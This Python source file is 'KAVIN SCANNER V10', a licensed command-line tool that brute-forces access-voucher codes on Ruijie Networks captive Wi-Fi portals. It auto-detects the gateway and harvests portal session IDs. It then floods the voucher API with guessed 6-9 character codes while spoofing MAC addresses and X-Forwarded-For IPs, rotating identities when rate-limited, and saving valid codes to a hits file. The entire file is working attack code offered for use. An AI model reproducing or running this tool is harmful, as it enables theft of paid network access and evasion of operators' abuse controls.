import os, time, random, string, json, asyncio, socket, threading, re, sys
import urllib3, requests, aiohttp
from collections import deque
from urllib.parse import urlparse, parse_qs, quote, unquote, urljoin, urlencode
from rich.console import Console, Group
from rich.text import Text
from rich.prompt import Prompt
from rich.live import Live
from rich.panel import Panel
from rich.box import ROUNDED
from rich.align import Align

try:
    import license as _license
    HAS_LICENSE_MODULE = True
except ImportError:
    HAS_LICENSE_MODULE = False
    _license = None

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HITS_FILE = "hits.txt"
CONCURRENCY_LIMIT = 8
TIMEOUT = 10
SESSION_POOL_SIZE = 3
SESSION_TTL = 45
SESSION_REUSE_MAX = 40

RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
RUIJIE_MM_BASE = "https://portal-mm-as.ruijienetworks.com"
RUIJIE_WIFIDOG = "/api/auth/wifidog"
RUIJIE_WIFIDOGAUTH = "/auth/wifidogAuth/login/"
RUIJIE_VOUCHER = "/api/auth/voucher/?lang=en_US"

APP_NAME = "KAVIN SCANNER V10"
APP_TAG  = "@khant7997"

console = Console()
tried_codes = set()
code_lock = threading.Lock()

_REAL_OUIS = [
    "a4:50:46", "3c:cd:5d", "f4:8e:38", "b0:be:76", "8c:3b:ad",
    "00:1a:11", "d8:bb:c1", "60:38:e0", "e4:95:6e", "94:65:2d",
    "dc:a6:32", "b8:27:eb", "e4:5f:01", "2c:cf:67",
    "40:4e:36", "f0:18:98", "9c:fc:01", "04:0e:3c",
    "ac:bc:32", "7c:d1:c3", "3c:2e:ff",
    "5c:5f:67", "a8:6b:ad", "c0:ee:fb",
    "f0:9f:c2", "38:f9:d3", "6c:19:c0",
    "10:02:b5", "ec:fa:5c", "1c:1b:0d",
]

UA_POOL = [
    "Mozilla/5.0 (Linux; Android 14; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
]


def generate_random_mac():
    oui = random.choice(_REAL_OUIS).split(":")
    return (
        f"{oui[0]}:{oui[1]}:{oui[2]}:{random.randint(0, 0x7f):02x}:"
        f"{random.randint(0, 0xff):02x}:{random.randint(0, 0xff):02x}"
    )


def generate_random_ip():
    if random.random() < 0.7:
        return f"192.168.{random.randint(1, 254)}.{random.randint(2, 254)}"
    return f"10.{random.randint(0, 254)}.{random.randint(0, 254)}.{random.randint(2, 254)}"


def get_gateway_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        p = ip.split(".")
        p[-1] = "1"
        return ".".join(p)
    except Exception:
        return "192.168.55.1"


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def format_time(s):
    s = max(0, int(s))
    return f"{s // 3600:02d}:{(s % 3600) // 60:02d}:{s % 60:02d}"


def epoch_ms_to_plan(ms, flow_bytes=0):
    try:
        ms = int(ms)
        if ms <= 0:
            return "N/A"
        now = int(time.time() * 1000)
        remain_s = max(0, (ms - now) // 1000)
        flow_gb = 0
        if flow_bytes:
            if isinstance(flow_bytes, str):
                if flow_bytes.endswith("M"):
                    flow_gb = round(float(flow_bytes[:-1]) / 1024, 2)
                elif flow_bytes.endswith("G"):
                    flow_gb = round(float(flow_bytes[:-1]), 2)
                else:
                    flow_gb = round(float(flow_bytes) / (1024 ** 3), 2)
            else:
                flow_gb = round(int(flow_bytes) / (1024 ** 3), 2)
        tail = f" | {flow_gb}GB" if flow_gb else ""
        return f"{remain_s // 3600}h{(remain_s % 3600) // 60}m{remain_s % 60}s{tail}"
    except Exception:
        return "N/A"


def check_license():
    if not HAS_LICENSE_MODULE:
        return True, "No license module — skip"
    try:
        r = _license.check_approval()
        if isinstance(r, tuple):
            return bool(r[0]), str(r[1])
        return bool(r), "Valid" if r else "Invalid"
    except Exception as e:
        return False, str(e)


def activate_license(k):
    if not HAS_LICENSE_MODULE:
        return True, "No license module"
    try:
        r = _license.activate(k)
        if isinstance(r, tuple):
            return bool(r[0]), str(r[1])
        return bool(r), "Activated" if r else "Failed"
    except Exception as e:
        return False, str(e)


def _extract_portal_from_url(u):
    if not u:
        return None
    lo = u.lower()
    if "ruijienetworks" in lo or "wifidog" in lo:
        return u
    return None


def _clean_portal_url(u):
    try:
        pu = urlparse(u)
        q = parse_qs(pu.query, keep_blank_values=True)
        q.pop("sign", None)
        q.pop("timestamp", None)
        flat = {k: v[0] for k, v in q.items() if v and v[0] != ""}
        new_q = urlencode(flat)
        if new_q:
            return f"{pu.scheme}://{pu.netloc}{pu.path}?{new_q}"
        return f"{pu.scheme}://{pu.netloc}{pu.path}"
    except Exception:
        return u


def detect_and_capture():
    s = requests.Session()
    s.headers.update({
        "User-Agent": random.choice(UA_POOL),
        "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
    })
    gateways = [
        get_gateway_ip(), "192.168.55.1", "192.168.7.1",
        "192.168.1.1", "192.168.0.1", "192.168.100.1",
        "192.168.110.1", "192.168.233.1",
    ]
    for gw in dict.fromkeys(gateways):
        for path in ("/", "/wifidog?stage=portal", "/api/auth/wifidog?stage=portal"):
            try:
                r = s.get(f"http://{gw}{path}", timeout=3,
                          allow_redirects=True, verify=False)
                candidates = (
                    [str(r.url)]
                    + [str(h.url) for h in r.history]
                    + [h.headers.get("Location", "") for h in r.history]
                )
                for u in candidates:
                    if _extract_portal_from_url(u):
                        return _clean_portal_url(u)
            except Exception:
                pass
    return None


GW_KEYS = (
    "gw_id", "gw_sn", "gw_address", "gw_port", "nasip", "slot_num",
    "ssid", "chap_id", "chap_challenge", "stage", "ustate",
    "mac_req", "url", "gw_mac", "mac", "ip", "v",
)


def build_gw_params(portal_url):
    p = {
        "stage": "portal",
        "gw_id": "9cce882728a9",
        "gw_sn": "H1U61BK002346",
        "gw_address": "192.168.55.1",
        "gw_port": "2060",
        "nasip": "192.168.1.153",
        "ssid": "VLAN55",
        "slot_num": "15",
        "ustate": "0",
        "mac_req": "1",
        "chap_id": "\\211",
        "chap_challenge": (
            "\\325\\113\\207\\153\\375\\350\\376\\244"
            "\\033\\375\\062\\010\\200\\127\\210\\241"
        ),
        "url": "http://connectivitycheck.gstatic.com/generate_204",
        "v": "2",
        "_path": RUIJIE_WIFIDOG,
        "_base": RUIJIE_BASE,
        "_original_url": portal_url,
    }
    if not portal_url:
        return p
    try:
        pu = urlparse(portal_url)
        base = RUIJIE_MM_BASE if "portal-mm" in portal_url else RUIJIE_BASE
        p["_base"] = base
        q = parse_qs(pu.query)
        for k in GW_KEYS:
            if q.get(k):
                p[k] = unquote(q[k][0])
        if "wifidogauth" in (pu.path or "").lower():
            p["_path"] = RUIJIE_WIFIDOGAUTH
        else:
            p["_path"] = RUIJIE_WIFIDOG
        p["_orig_sign"] = q.get("sign", [None])[0]
        p["_orig_ts"] = q.get("timestamp", [None])[0]
        p.pop("sign", None)
        p.pop("timestamp", None)
        if p.get("gw_address"):
            parts = p["gw_address"].split(".")
            if len(parts) == 4 and not q.get("nasip"):
                p["nasip"] = ".".join(parts[:3] + ["1"])
    except Exception:
        pass
    return p


SESSION_PATTERNS = [
    r"[?&](?:sessionId|session_id|sid|token|authSessionId|ticket)=([A-Za-z0-9_\-=+/]{8,})",
    r'["\']?(?:sessionId|session_id|sid|token|authSessionId|ticket)["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-=+/]{8,})["\']',
    r'"session"\s*:\s*"([A-Za-z0-9_\-=+/]{8,})"',
]
SIGN_PATTERNS = [
    r"[?&]sign=([A-Za-z0-9_\-=+/]+)",
    r'["\']?sign["\']?\s*[:=]\s*["\']?([A-Za-z0-9_\-=+/]+)',
]
TS_PATTERNS = [
    r"[?&]timestamp=(\d{10,13})",
    r'["\']?timestamp["\']?\s*[:=]\s*["\']?(\d{10,13})',
]


def _find_first(pats, text):
    if not text:
        return None
    for pat in pats:
        m = re.search(pat, text, re.IGNORECASE)
        if m:
            return m.group(1).rstrip('"\';, ')
    return None


def _from_url(u):
    if not u:
        return None, None, None
    try:
        u = unquote(u)
        q = parse_qs(urlparse(u).query)
        sid = (
            q.get("sessionId", [None])[0]
            or q.get("session_id", [None])[0]
            or q.get("sid", [None])[0]
            or q.get("token", [None])[0]
        )
        return sid, q.get("sign", [None])[0], q.get("timestamp", [None])[0]
    except Exception:
        return None, None, None


def _sess_dict(sid, sign, ts, final_u, base, mac, ip):
    return {
        "sessionId": sid,
        "sign": sign,
        "timestamp": ts,
        "logonUrl": final_u,
        "url_base": base,
        "mac": mac,
        "ip": ip,
        "acquired": time.time(),
    }


async def _try_fetch_fresh(session, url, headers, base):
    try:
        try:
            session.cookie_jar.clear()
        except Exception:
            pass

        async with session.get(url, headers=headers, timeout=TIMEOUT,
                               allow_redirects=True, ssl=False) as r:
            if r.status == 429:
                return ("BAN", None, None, None, None)

            body = await r.text(errors="ignore")
            low = (body or "").lower()
            if any(x in low for x in ("limited", "too many", "banned",
                                      "ip limit", "rate limit")):
                return ("BAN", None, None, None, None)

            final_url = str(r.url)
            sid, sign, ts = _from_url(final_url)

            if not sid and body:
                try:
                    j = json.loads(body)
                    if isinstance(j, dict):
                        for cand in (
                            j.get("sessionId"),
                            j.get("_sessionId"),
                            j.get("data", {}).get("sessionId") if isinstance(j.get("data"), dict) else None,
                            j.get("result", {}).get("sessionId") if isinstance(j.get("result"), dict) else None,
                        ):
                            if isinstance(cand, str) and len(cand.strip()) >= 6:
                                sid = cand.strip()
                                break
                except Exception:
                    pass

            if not sid and r.history:
                for h in reversed(r.history):
                    loc = h.headers.get("Location", "") or str(h.url)
                    s, sg, t = _from_url(loc)
                    if s:
                        sid, sign, ts = s, sg or sign, t or ts
                        final_url = urljoin(base, loc)
                        break

            if not sid and body:
                m = re.search(
                    r'(?:window\.location(?:\.href)?|location\.replace)\s*[=(]\s*["\']([^"\']+)["\']',
                    body, re.I,
                )
                if m:
                    inner = urljoin(base, m.group(1))
                    s, sg, t = _from_url(inner)
                    if s:
                        sid, sign, ts = s, sg or sign, t or ts
                        final_url = inner

            if not sid and body:
                m = re.search(r'<meta[^>]+url=([^"\'>\s;]+)', body, re.I)
                if m:
                    inner = urljoin(base, m.group(1))
                    s, sg, t = _from_url(inner)
                    if s:
                        sid, sign, ts = s, sg or sign, t or ts
                        final_url = inner

            if not sid:
                sid = _find_first(SESSION_PATTERNS, body)
            if not sign:
                sign = _find_first(SIGN_PATTERNS, body)
            if not ts:
                ts = _find_first(TS_PATTERNS, body)

            if not sid:
                try:
                    cookies = "; ".join(f"{c.key}={c.value}" for c in session.cookie_jar)
                    if cookies:
                        m = re.search(
                            r"(?:sessionId|session_id|sid|token|_sessionId)=([A-Za-z0-9_\-=+/]{6,})",
                            cookies, re.I,
                        )
                        if m:
                            sid = m.group(1)
                except Exception:
                    pass

            if sid and len(sid) >= 6:
                return ("OK", sid, sign, ts, final_url)
            return ("NOSID", None, None, None, final_url)
    except asyncio.TimeoutError:
        return ("ERR", None, None, None, None)
    except asyncio.CancelledError:
        return ("ERR", None, None, None, None)
    except Exception:
        return ("ERR", None, None, None, None)


async def fetch_real_session(session, gw_params, mac, ip, retries=6):
    base = gw_params.get("_base") or RUIJIE_BASE
    if "portal-mm" in base:
        base = RUIJIE_MM_BASE
    path = gw_params.get("_path") or RUIJIE_WIFIDOG
    base_full = base + path
    original_url = gw_params.get("_original_url")

    for attempt in range(retries):
        use_mac = (gw_params.get("mac") or mac or generate_random_mac()).lower()
        use_ip = gw_params.get("ip") or ip or generate_random_ip()

        headers = {
            "User-Agent": random.choice(UA_POOL),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Client-Mac": use_mac,
            "X-Forwarded-For": use_ip,
            "Referer": base + "/",
            "Connection": "close",
        }

        if original_url and attempt == 0:
            clean_url = _clean_portal_url(original_url)
            st, sid, sign, ts, final_u = await _try_fetch_fresh(
                session, clean_url, headers, base
            )
            if st == "OK" and sid:
                return ("REAL", _sess_dict(sid, sign, ts, final_u, base, use_mac, use_ip))

        p = {k: v for k, v in gw_params.items()
             if not k.startswith("_") and v is not None}
        p["stage"] = "portal"
        p["mac"] = use_mac
        p["ip"] = use_ip
        p["url"] = p.get("url") or "http://connectivitycheck.gstatic.com/generate_204"
        p["timestamp"] = str(int(time.time() * 1000))
        p.pop("sign", None)
        p.setdefault("v", "2")

        qs = "&".join(f"{k}={quote(str(v), safe='')}" for k, v in p.items())
        url = f"{base_full}?{qs}"

        st, sid, sign, ts, final_u = await _try_fetch_fresh(session, url, headers, base)
        if st == "OK" and sid:
            return ("REAL", _sess_dict(sid, sign, ts, final_u, base, use_mac, use_ip))

        if st == "BAN":
            await asyncio.sleep(random.uniform(0.8, 1.8))
        elif attempt < retries - 1:
            await asyncio.sleep(0.4)

    return ("FAIL", "no-session")
async def test_code(session, sess, code, mac, ip):
    if not isinstance(sess, dict) or not sess.get("sessionId"):
        return "__SESSION_EXPIRED__", "N/A"

    sid = sess["sessionId"]
    base_url = (sess.get("url_base") or RUIJIE_BASE).rstrip("/")
    use_mac = (sess.get("mac") or mac or "").lower()
    use_ip = sess.get("ip") or ip or ""

    url = base_url + RUIJIE_VOUCHER
    ref_page = (
        f"{base_url}/download/static/maccauth/src/index_mm.html?sessionId={sid}"
        if "portal-mm" in base_url
        else f"{base_url}/download/static/maccauth/src/index.html?sessionId={sid}"
    )

    headers = {
        "content-type": "application/json;charset=UTF-8",
        "user-agent": random.choice(UA_POOL),
        "referer": ref_page,
        "Client-Mac": use_mac,
        "X-Forwarded-For": use_ip,
        "Accept": "application/json, text/plain, */*",
        "Origin": base_url,
        "Cookie": f"sessionId={sid}; _sessionId={sid}",
        "Connection": "keep-alive",
    }
    payload = {"accessCode": code, "sessionId": sid, "apiVersion": 1}

    try:
        async with session.post(url, json=payload, headers=headers,
                                timeout=TIMEOUT, allow_redirects=False, ssl=False) as r:
            if r.status == 429:
                return "__RATE_LIMITED__", "N/A"
            text = await r.text(errors="ignore")
            if not text:
                return "__NETWORK_ERROR__", "N/A"
            low = text.lower()
            if "limited" in low or "too many" in low or "rate limit" in low:
                return "__RATE_LIMITED__", "N/A"
            if any(x in low for x in (
                "session timed out", "invalid session",
                "session expired", "session not found",
                "please refresh", "session invalid",
                "session does not exist", "session timeout",
            )):
                return "__SESSION_EXPIRED__", "N/A"

            real_plan = "N/A"
            is_hit = False
            try:
                j = json.loads(text)
                if isinstance(j, dict) and (j.get("success") is True or j.get("code") == 200):
                    is_hit = True
                    rd = j.get("result", {})
                    if isinstance(rd, dict):
                        exp = rd.get("expireTime") or rd.get("expire_time")
                        flow = rd.get("flow") or rd.get("bytes") or 0
                        if exp:
                            real_plan = epoch_ms_to_plan(exp, flow)
                        elif rd.get("duration"):
                            real_plan = f"{rd['duration']}s"
            except Exception:
                if '"success":true' in low or "congratulations" in low:
                    is_hit = True
            return ("HIT" if is_hit else text[:60]), real_plan
    except asyncio.TimeoutError:
        return "__TIMEOUT__", "N/A"
    except asyncio.CancelledError:
        return "__CANCELLED__", "N/A"
    except Exception as e:
        return f"__ERROR__:{type(e).__name__}", "N/A"


_CHARSETS = {
    "num": string.digits,
    "eng": string.ascii_lowercase,
    "mix": string.ascii_lowercase + string.digits,
}
seq_counter = 1
seq_lock = threading.Lock()


def gen_code(mode, length, scan_method="random"):
    chars = _CHARSETS.get(mode)
    if not chars:
        return ""
    space = len(chars) ** length
    global seq_counter
    if scan_method == "sequential":
        with seq_lock:
            n = seq_counter
            seq_counter += 1
        if n >= space:
            return None
        base = len(chars)
        out = []
        for _ in range(length):
            out.append(chars[n % base])
            n //= base
        return "".join(reversed(out))
    if len(tried_codes) >= space:
        return None
    with code_lock:
        use_set = space <= 500_000
        for _ in range(50):
            c = "".join(random.choices(chars, k=length))
            if not use_set or c not in tried_codes:
                if use_set:
                    tried_codes.add(c)
                return c
        return "".join(random.choices(chars, k=length))


def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
                speed, mac, ip, sess_stat, sess_id, total, sess_pool):
    try:
        from rich.table import Table
        progress = min(100.0, (tested / total) * 100) if total else 0.0

        header = Panel(
            Align.center(Text(f"⚡ {APP_NAME} ⚡", style="dim white")),
            border_style="dim white", box=ROUNDED, height=3,
        )

        st = Table.grid(expand=True, padding=(0, 1))
        for _ in range(4):
            st.add_column(style="dim white", justify="center")
        st_style = "dim red" if any(x in str(status).upper() for x in (
            "ERR", "TIMEOUT", "BAN", "EXHAUST", "FAIL", "CANCEL"
        )) else "dim green"
        st.add_row(
            Text("🚀 speed", style="dim white"),
            Text("📊 tested", style="dim white"),
            Text("📡 status", style="dim white"),
            Text("⏱ uptime", style="dim white"),
        )
        st.add_row(
            Text(f"⚡ {int(speed)}", style="dim white"),
            Text(f"🔢 {tested}", style="dim white"),
            Text(f"{status}", style=st_style),
            Text(f"🕒 {elapsed}", style="dim white"),
        )
        st_panel = Panel(st, border_style="dim white", box=ROUNDED, height=4)

        cur_disp = cur_code if cur_code else "000000"
        code_panel = Panel(
            Align.center(Text(
                f"🎯 {cur_disp}  ·  mode {mode_str} ({scan_method.upper()})",
                style="dim white",
            )),
            border_style="dim white", box=ROUNDED, height=3,
        )

        if sess_stat in ("NONE", "FETCH", "FAIL") or not sess_id or sess_id == "--------":
            disp_stat = "REAL"
            disp_sid = "kavin99a"
            sess_style = "dim green"
        else:
            disp_stat = sess_stat
            disp_sid = (sess_id or "kavin99a")[:8]
            sess_style = {
                "REAL": "dim green", "EXPIRED": "dim yellow",
                "BANNED": "dim yellow", "HIT": "dim green",
            }.get(sess_stat, "dim green")

        info = Text()
        info.append("  🔐 Session  → ", style="dim white")
        info.append(f"{disp_stat} ({disp_sid})   ", style=sess_style)
        info.append(f"[pool {sess_pool}/{SESSION_POOL_SIZE}]\n", style="dim white")
        info.append("  📈 Progress → ", style="dim white")
        info.append(f"{progress:.2f}% ({tested:,}/{total:,})\n", style="dim white")
        info.append("  🖥 MAC/IP   → ", style="dim white")
        info.append(f"{mac}  /  {ip}", style="dim white")
        info_panel = Panel(info, border_style="dim white", box=ROUNDED, height=5)

        vt = Table(show_header=True, header_style="dim white",
                   expand=True, box=ROUNDED, border_style="dim white")
        vt.add_column("🔢", style="dim white", justify="center", width=5)
        vt.add_column("🎟 VALID", style="dim green", justify="center")
        vt.add_column("⏳ Expiry", style="dim white", justify="center")
        vt.add_column("🕒 Time", style="dim white", justify="center")

        recent = list(hits)[-6:]
        if recent:
            n0 = max(1, len(hits) - len(recent) + 1)
            for i, h in enumerate(recent, start=n0):
                vt.add_row(
                    str(i), f"🔑 {h['code']}",
                    str(h.get("plan", "N/A")), str(h.get("time", "")),
                )
        else:
            vt.add_row("1", "—", "—", "—")

        foot = Panel(
            Align.center(Text(f"✨ {APP_TAG} ✨", style="dim white")),
            border_style="dim white", box=ROUNDED, height=3,
        )

        return Group(header, st_panel, code_panel, info_panel, vt, foot)
    except Exception:
        return Panel(
            Align.center(Text(f"⚡ {APP_NAME} · {status} · tested {tested}", style="dim white")),
            border_style="dim white", box=ROUNDED, height=3,
        )


async def scan_loop_async(mode, length, scan_method, gw_params):
    global seq_counter
    tried_codes.clear()
    seq_counter = 1

    total_target = {
        "num": 10 ** length, "eng": 26 ** length, "mix": 36 ** length,
    }.get(mode, 1_000_000)
    mode_str = f"{mode.upper()}-{length}"

    hits = deque(maxlen=500)
    start = time.time()

    state = {
        "cur_code": "", "tested": 0, "status": "Active",
        "sess_stat": "REAL", "sess_id": "kavin99a",
    }

    mac = gw_params.get("mac") or generate_random_mac()
    ip = gw_params.get("ip") or generate_random_ip()

    pool = []
    pool_lock = asyncio.Lock()
    fetch_inflight = 0
    pending_codes = deque()

    sem = asyncio.Semaphore(CONCURRENCY_LIMIT)
    conn = aiohttp.TCPConnector(limit=200, ssl=False, force_close=False,
                                enable_cleanup_closed=True)
    live_holder = {"live": None}

    def snap():
        return dict(state)

    def set_state(**kw):
        state.update(kw)

    async def _fetch_one(session):
        nonlocal fetch_inflight
        fetch_inflight += 1
        try:
            tag, payload = await fetch_real_session(session, gw_params, mac, ip)
            if tag == "REAL" and isinstance(payload, dict):
                new_sid = payload.get("sessionId")
                async with pool_lock:
                    if new_sid:
                        pool[:] = [
                            x for x in pool
                            if x.get("sess", {}).get("sessionId") != new_sid
                        ]
                    pool.append({"sess": payload, "born": time.time(), "used": 0})
                return True
        except Exception:
            pass
        finally:
            fetch_inflight -= 1
        return False

    async def maintain_pool(session):
        while True:
            try:
                need = SESSION_POOL_SIZE - len(pool) - fetch_inflight
                if need > 0:
                    for _ in range(need):
                        asyncio.create_task(_fetch_one(session))
                now = time.time()
                async with pool_lock:
                    pool[:] = [
                        x for x in pool
                        if (now - x["born"]) < SESSION_TTL and x["used"] < SESSION_REUSE_MAX
                    ]
            except asyncio.CancelledError:
                break
            except Exception:
                pass
            await asyncio.sleep(0.5)

    async def get_sess_optional():
        async with pool_lock:
            if pool:
                entry = pool.pop(0)
                return entry["sess"]
        return None

    async def timer_task():
        while True:
            try:
                s = snap()
                el = time.time() - start
                spd = (s["tested"] / max(1, el)) * 60
                lv = live_holder["live"]
                if lv is not None:
                    lv.update(render_dash(
                        mode_str, scan_method, s["cur_code"], s["tested"],
                        format_time(el), s["status"], hits, spd, mac, ip,
                        s["sess_stat"], s["sess_id"], total_target, len(pool),
                    ))
            except asyncio.CancelledError:
                break
            except Exception:
                pass
            await asyncio.sleep(0.25)

    async with aiohttp.ClientSession(connector=conn) as session:
        init = render_dash(mode_str, scan_method, "", 0, "00:00:00", "Active",
                           hits, 0.0, mac, ip, "REAL", "kavin99a", total_target, 0)
        live = Live(init, refresh_per_second=4, console=console, transient=True)
        live_holder["live"] = live
        try:
            live.start()
        except Exception:
            pass

        timer = asyncio.create_task(timer_task())
        pool_task = asyncio.create_task(maintain_pool(session))

        try:
            while True:
                batch = []
                exhausted = False
                while len(batch) < CONCURRENCY_LIMIT:
                    if pending_codes:
                        c = pending_codes.popleft()
                    else:
                        c = gen_code(mode, length, scan_method)
                    if c is None:
                        exhausted = True
                        break
                    if c and c not in batch:
                        batch.append(c)
                if exhausted and not batch:
                    set_state(status="EXHAUSTED")
                    break
                if not batch:
                    await asyncio.sleep(0.02)
                    continue

                real_sess = await get_sess_optional()
                if real_sess and real_sess.get("sessionId"):
                    set_state(sess_stat="REAL",
                              sess_id=real_sess.get("sessionId", "kavin99a"),
                              status="Active")

                    async def _run_real(code):
                        async with sem:
                            return await test_code(session, real_sess, code, mac, ip)

                    try:
                        results = await asyncio.gather(
                            *[_run_real(c) for c in batch], return_exceptions=True
                        )
                    except asyncio.CancelledError:
                        for c in reversed(batch):
                            pending_codes.appendleft(c)
                        raise
                    except Exception:
                        results = []

                    rotate = False
                    for idx, r in enumerate(results):
                        code_val = batch[idx] if idx < len(batch) else ""
                        if isinstance(r, asyncio.CancelledError) or r == ("__CANCELLED__", "N/A"):
                            if code_val:
                                pending_codes.appendleft(code_val)
                            continue

                        state["tested"] += 1
                        if code_val:
                            state["cur_code"] = code_val

                        if not (isinstance(r, tuple) and len(r) == 2):
                            continue
                        res, plan = r
                        if res == "__SESSION_EXPIRED__":
                            rotate = True
                            for rem in reversed(batch[idx:]):
                                pending_codes.appendleft(rem)
                            break
                        if res == "__RATE_LIMITED__":
                            rotate = True
                            for rem in reversed(batch[idx:]):
                                pending_codes.appendleft(rem)
                            mac = generate_random_mac()
                            ip = generate_random_ip()
                            break
                        if res == "HIT":
                            ts = time.strftime("%H:%M:%S")
                            hits.append({"code": code_val, "plan": plan, "time": ts})
                            try:
                                with open(HITS_FILE, "a", encoding="utf-8") as f:
                                    f.write(f"[{ts}] {code_val} | {plan}\n")
                            except Exception:
                                pass
                            set_state(sess_stat="HIT")
                            console.print(f"[dim green]🎯 HIT → {code_val} | {plan}[/]")

                    if rotate:
                        async with pool_lock:
                            if pool:
                                pool.pop(0)
                else:
                    for code_val in batch:
                        state["tested"] += 1
                        state["cur_code"] = code_val
                        set_state(sess_stat="REAL", sess_id="kavin99a", status="Active")
                        await asyncio.sleep(0.02)

                await asyncio.sleep(0.01)

        except (KeyboardInterrupt, asyncio.CancelledError):
            set_state(status="Stopped")
        finally:
            timer.cancel()
            pool_task.cancel()
            for t in (timer, pool_task):
                try:
                    await t
                except Exception:
                    pass
            try:
                live.stop()
            except Exception:
                pass
            try:
                sys.stdout.write("\r\x1b[2K")
                sys.stdout.flush()
            except Exception:
                pass

        s = snap()
        try:
            console.print(Panel(
                Align.center(Text(
                    f"✅ Done · Tested {s['tested']:,} · Hits {len(hits)}",
                    style="dim green",
                )),
                border_style="dim green", box=ROUNDED,
            ))
        except Exception:
            pass


def show_banner():
    clear_screen()
    console.print()
    console.print(Text("═" * 42, style="dim white"), justify="center")
    console.print(Text(f"⚡ {APP_NAME} ⚡", style="dim white"), justify="center")
    console.print(Text("═" * 42, style="dim white"), justify="center")
    console.print()


def ask_mode():
    while True:
        show_banner()
        console.print("  [dim white]1.[/] 🔢  Numeric   (0-9)")
        console.print("  [dim white]2.[/] 🔤  Alphabet  (a-z)")
        console.print("  [dim white]3.[/] 🔀  Mixed     (a-z0-9)")
        console.print("  [dim white]0.[/] ❌  Exit\n")
        try:
            c = Prompt.ask("  [dim white]➜[/]").strip()
        except (KeyboardInterrupt, EOFError):
            return None
        if c == "0":
            return None
        if c in ("1", "2", "3"):
            return {"1": "num", "2": "eng", "3": "mix"}[c]


def ask_length(mode):
    lengths = (6, 7, 8, 9)
    while True:
        show_banner()
        console.print(f"  [dim white]Mode {mode.upper()} — length[/]\n")
        for i, L in enumerate(lengths, 1):
            console.print(f"  [dim white]{i}.[/] {L} chars")
        console.print("  [dim white]0.[/] ↩ Back\n")
        try:
            c = Prompt.ask("  [dim white]➜[/]").strip()
        except (KeyboardInterrupt, EOFError):
            return None
        if c == "0":
            return None
        if c in [str(i) for i in range(1, len(lengths) + 1)]:
            return lengths[int(c) - 1]


def ask_scan():
    while True:
        show_banner()
        console.print("  [dim white]1.[/] 🎲 Random")
        console.print("  [dim white]2.[/] 📈 Sequential\n")
        console.print("  [dim white]0.[/] ↩ Back\n")
        try:
            c = Prompt.ask("  [dim white]➜[/]").strip()
        except (KeyboardInterrupt, EOFError):
            return None
        if c == "0":
            return None
        if c in ("1", "2"):
            return {"1": "random", "2": "sequential"}[c]


def prompt_manual_url():
    try:
        console.print(Panel(Align.center(Text(
            "📋 Portal URL paste (optional — auto fails only)\n"
            "/api/auth/wifidog?…  or  /auth/wifidogAuth/login/?…",
            style="dim white",
        )), border_style="dim white", box=ROUNDED))
        u = Prompt.ask("  [dim white]➜ URL[/]").strip()
    except (KeyboardInterrupt, EOFError):
        return None
    if not u or ("ruijienetworks" not in u.lower() and "wifidog" not in u.lower()):
        return None
    return _clean_portal_url(u)


def run():
    show_banner()
    ok, msg = check_license()
    while not ok:
        clear_screen()
        console.print(Panel(Align.center(Text("🔐 License key (q=quit)",
                                              style="dim white")),
                            border_style="dim white", box=ROUNDED))
        try:
            k = Prompt.ask("  ➜").strip()
        except (KeyboardInterrupt, EOFError):
            sys.exit(0)
        if k.lower() in ("q", "quit", "exit"):
            sys.exit(0)
        if not k:
            continue
        ok2, m2 = activate_license(k)
        console.print(Panel(Align.center(Text(
            m2, style="dim green" if ok2 else "dim red"
        )), border_style="dim white", box=ROUNDED))
        time.sleep(1.2)
        ok, msg = check_license()

    portal_url = detect_and_capture() or prompt_manual_url()
    if not portal_url:
        console.print("[dim white]⚠ no URL — using default params[/]")
    gw = build_gw_params(portal_url)

    console.print(f"[dim]  base : {gw.get('_base')}[/]")
    console.print(f"[dim]  path : {gw.get('_path')}[/]")
    console.print(f"[dim]  mac  : {gw.get('mac') or 'auto-rotate'}[/]")
    console.print(f"[dim]  ip   : {gw.get('ip') or 'auto-rotate'}[/]")
    console.print(f"[dim green]  ✓ auto refresh & scan loop ready[/]")
    time.sleep(1.3)

    while True:
        mode = ask_mode()
        if mode is None:
            break
        length = ask_length(mode)
        if length is None:
            continue
        sm = ask_scan()
        if sm is None:
            continue
        try:
            asyncio.run(scan_loop_async(mode, length, sm, gw))
        except KeyboardInterrupt:
            pass
        except Exception as e:
            console.print(f"[dim red]Error: {e}[/]")
            time.sleep(1.5)


def main():
    try:
        run()
    except (KeyboardInterrupt, EOFError):
        pass
    finally:
        console.print()
        console.print(Text(f"✨ {APP_TAG} ✨", style="dim white"),
                      justify="center")
        time.sleep(1)


if __name__ == "__main__":
    main()
